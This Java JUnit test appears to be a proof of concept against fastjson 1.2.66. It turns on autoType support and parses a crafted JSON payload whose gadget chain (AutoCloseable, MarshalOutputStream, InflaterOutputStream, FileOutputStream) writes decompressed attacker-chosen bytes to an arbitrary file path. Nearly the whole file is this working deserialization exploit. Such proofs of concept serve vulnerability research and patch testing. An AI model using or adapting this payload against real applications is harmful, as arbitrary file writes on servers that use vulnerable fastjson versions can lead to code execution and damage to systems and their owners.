import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class fastjson_1_2_66_jdk11 {
    @Test
    public void writeDemo() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"sun.rmi.server.MarshalOutputStream\",\"out\":{\"@type\":\"java.util.zip.InflaterOutputStream\",\"out\":{\"@type\":\"java.io.FileOutputStream\",\"file\":\"/Users/ppp/Desktop/dododod\",\"append\":true},\"infl\":{\"input\":{\"array\":\"eJxLLE5JTCkGAAh5AnE=\",\"limit\":14}},\"bufLen\":\"100\"},\"protocolVersion\":1}";
        Object jsonObject = JSON.parseObject(payload);
    }
}
